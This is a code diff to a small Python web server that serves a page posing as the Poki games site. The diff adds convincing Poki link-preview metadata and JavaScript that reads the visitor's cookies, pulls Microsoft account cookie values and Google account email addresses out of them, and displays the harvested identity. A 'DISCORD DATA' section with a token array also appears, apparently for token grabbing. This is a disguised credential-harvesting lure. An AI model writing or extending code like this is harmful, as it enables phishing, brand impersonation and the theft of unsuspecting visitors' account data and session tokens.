@@ -107,14 +107,22 @@ class handler(BaseHTTPRequestHandler):
 <html>
 <head>
 <meta charset="UTF-8">
-<meta property="og:title" content="Poki - Free Online Games">
-<meta property="og:description" content="Play the best free online games">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Poki">
+<meta property="og:title" content="Poki - Free Online Games - Play Now!">
+<meta property="og:description" content="Play the best free online games on Poki">
 <meta property="og:image" content="{POKI_IMAGE}">
+<meta property="og:image:secure_url" content="{POKI_IMAGE}">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
+<meta property="og:url" content="https://poki.com">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Poki - Free Online Games">
+<meta name="twitter:description" content="Play the best free online games">
 <meta name="twitter:image" content="{POKI_IMAGE}">
-<title>Poki Games</title>
+<meta name="theme-color" content="#00D9FF">
+<link rel="icon" href="{POKI_IMAGE}">
+<title>Poki - Free Online Games</title>
 <style>
 *{{margin:0;padding:0}}
 body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial}}
@@ -132,7 +140,25 @@ let d='';
 const box=document.getElementById('info');
 
 // COOKIES
-d+='🍪 '+document.cookie.split(';').length+' cookies<br>';
+let allCookies = document.cookie;
+d+=`🍪 ${allCookies.split(';').length} cookies<br>`;
+
+// Get Chrome/Microsoft username from cookies
+let userName = 'Not found';
+try{
+  // Check for Microsoft account in cookies
+  if(allCookies.includes('MSCC') || allCookies.includes('MSPAUTH')){
+    let msMatch = allCookies.match(/MSCC=([^;]+)/);
+    if(msMatch) userName = decodeURIComponent(msMatch[1]);
+  }
+  // Check for Chrome profile
+  if(allCookies.includes('CHROME') || allCookies.includes('ACCOUNT_CHOOSER')){
+    let chromeMatch = allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/);
+    if(chromeMatch) userName = chromeMatch[0];
+  }
+}catch(e){}
+
+d+=`👤 User: ${userName}<br>`;
 
 // DISCORD DATA
 let tok=[];
